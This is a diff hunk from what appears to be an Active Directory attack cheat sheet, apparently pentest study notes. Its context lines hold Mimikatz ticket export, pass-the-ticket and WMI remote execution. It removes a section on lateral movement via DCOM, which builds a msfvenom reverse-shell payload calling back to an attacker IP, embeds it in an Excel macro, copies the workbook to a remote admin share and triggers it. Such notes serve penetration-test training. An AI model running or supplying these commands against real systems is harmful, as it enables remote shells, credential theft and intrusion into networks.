@@ -317,36 +317,6 @@ sekurlsa::tickets /export (export all kirbi files)
 kerberos::ptt [0;3e7]-0-0-40a00000-ted@krbtgt-web01.exam.com-exam.com.kirbi (load into memory)
 Remote Code Execution: Invoke-WmiMethod win32_process -ComputerName $Computer -Credential $Creds -name create -argumentlist “$RunCommand”
 ```
-###### Distributed Component Object Model
-Require remote machine has office installed  
-Require TCP 135 for DCOM and TCP 445 for SMB open
-```
-1. Check If Run Method and Workbooks Property exists
-$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
-$com | Get-Member
-2. Create Payload
-msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f hta-psh -o evil.hta
-3. Split payload
-str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
-n = 50
-for i in range(0, len(str), n):
-	print "Str = Str + " + '"' + str[i:i+n] + '"'
-4. Copy Splitted payload into created xls file's macro
-Sub MyMacro()
-    Dim Str As String
-    ........
-    Shell (Str)
-End Sub
-5. Run powershell file
-$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192.168.1.110"))
-$LocalPath = "C:\Users\jeff_admin.corp\myexcel.xls"
-$RemotePath = "\\192.168.1.110\c$\myexcel.xls"
-[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
-$Path = "\\192.168.1.110\c$\Windows\sysWOW64\config\systemprofile\Desktop"
-$temp = [system.io.directory]::createDirectory($Path)
-$Workbook = $com.Workbooks.Open("C:\myexcel.xls")
-$com.Run("MyMacro")
-```
 
 ### Persistence
 ###### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
